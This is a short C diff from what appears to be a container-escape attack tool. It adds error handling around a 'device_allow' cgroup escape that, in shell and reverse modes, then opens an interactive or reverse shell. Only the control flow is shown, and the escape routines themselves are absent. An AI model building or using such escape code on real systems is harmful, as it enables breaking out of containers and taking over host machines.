@@ -219,23 +219,30 @@ int main(int argc, char *argv[]) {
                 printf_wrapper(ERROR, "Escape by device_allow not support exec mode\n");
                 exit(EXIT_SUCCESS);
             } else if (attack_info.attack_mode == SHELL) {
-                if (cap_sys_admin_check() == -1) {
+                if (check_cap_sys_admin() == -1) {
                     printf_wrapper(ERROR,
                                    "Current process don't have CAP_SYS_ADMIN capability，can't escape by using device_allow\n");
+                    return -1;
                 }
                 device_allow_attack_info.cgroup_id = malloc(512 * sizeof(char));
                 strcpy(device_allow_attack_info.cgroup_id, cgroup_id);
-                escape_by_device_allow();
-                device_allow_shell();
+                if (escape_by_device_allow() != -1) {
+                    device_allow_shell();
+                } else {
+                    printf_wrapper(ERROR, "Escape by device_allow failed\n");
+                }
             } else if (attack_info.attack_mode == REVERSE) {
-                if (cap_sys_admin_check() == -1) {
+                if (check_cap_sys_admin() == -1) {
                     printf_wrapper(ERROR,
                                    "Current process don't have CAP_SYS_ADMIN capability，can't escape by using device_allow\n");
                 }
                 device_allow_attack_info.cgroup_id = malloc(512 * sizeof(char));
                 strcpy(device_allow_attack_info.cgroup_id, cgroup_id);
-                escape_by_device_allow();
-                device_allow_reverse();
+                if (escape_by_device_allow() != -1) {
+                    device_allow_reverse();
+                } else {
+                    printf_wrapper(ERROR, "Escape by device_allow failed\n");
+                }
             }
             break;
         }
